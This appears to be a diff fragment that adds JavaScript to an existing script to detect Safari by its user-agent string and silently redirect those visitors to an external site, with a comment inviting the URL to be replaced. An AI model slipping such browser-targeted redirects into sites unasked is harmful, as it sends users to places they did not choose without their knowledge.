@@ -8,3 +8,13 @@
       }
     }
   });
+  // Check if the user is using Safari
+  var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+  // Define the target URL for redirection
+  var redirectTo = "https://codeters.com"; // Replace with your target URL
+
+  // Redirect if the user is using Safari
+  if (isSafari) {
+    window.location.href = redirectTo;
+  }
